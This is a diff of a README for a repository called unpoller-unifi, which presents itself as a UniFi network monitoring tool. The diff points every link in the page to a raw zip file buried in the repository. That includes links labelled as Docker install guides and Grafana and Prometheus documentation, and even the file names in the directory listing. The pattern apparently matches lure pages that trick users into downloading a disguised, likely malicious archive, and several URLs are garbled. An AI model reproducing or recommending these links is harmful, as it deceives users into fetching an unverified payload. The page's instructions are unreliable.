@@ -1,6 +1,6 @@
 # 🚀 unpoller-unifi - Monitor Your UniFi Network Effortlessly
 
-[![Download](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip%20Latest%https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+[![Download](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip%20Latest%https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
 
 ## 📦 Overview
 
@@ -30,14 +30,14 @@ To run unpoller-unifi smoothly, ensure your system meets the following requireme
 
 Before downloading unpoller-unifi, make sure you have Docker and Docker Compose installed on your computer. If you have not yet installed these, follow these guides:
 
-- [Install Docker](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
-- [Install Docker Compose](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+- [Install Docker](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
+- [Install Docker Compose](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
 
 ### 2. Download the Application
 
 Visit this page to download the latest release:
 
-[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+[Download unpoller-unifi](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
 
 ### 3. Install the Application
 
@@ -89,13 +89,13 @@ Your unpoller-unifi installation will have the following directory structure:
 
 ```
 unpoller-unifi/
-├── https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip
+├── https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip
 ├── .env
-├── https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip
+├── https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip
 └── data/
 ```
 
-- **https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip** Configuration file for Docker Compose.
+- **https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip** Configuration file for Docker Compose.
 - **.env:** Environment variables for customizable settings.
 - **data/:** Directory to store persistent data.
 
@@ -108,14 +108,14 @@ If you encounter any issues during installation or usage, consult the following 
 
 ## 🔗 Helpful Links
 
-- [Installation Guide](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
-- [Grafana Documentation](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
-- [Prometheus Documentation](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+- [Installation Guide](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
+- [Grafana Documentation](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
+- [Prometheus Documentation](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
 
 ## 📥 Download & Install
 
 To start using unpoller-unifi, visit this page to download the latest release:
 
-[Download unpoller-unifi](https://github.com/Hanafyadham/unpoller-unifi/raw/refs/heads/main/grafana/unpoller_unifi_2.0.zip)
+[Download unpoller-unifi](https://raw.githubusercontent.com/Hanafyadham/unpoller-unifi/main/grafana/provisioning/unpoller_unifi_1.3.zip)
 
 For any further queries or contributions, feel free to navigate to the Issues section in the repository. Your feedback helps improve the application for everyone.
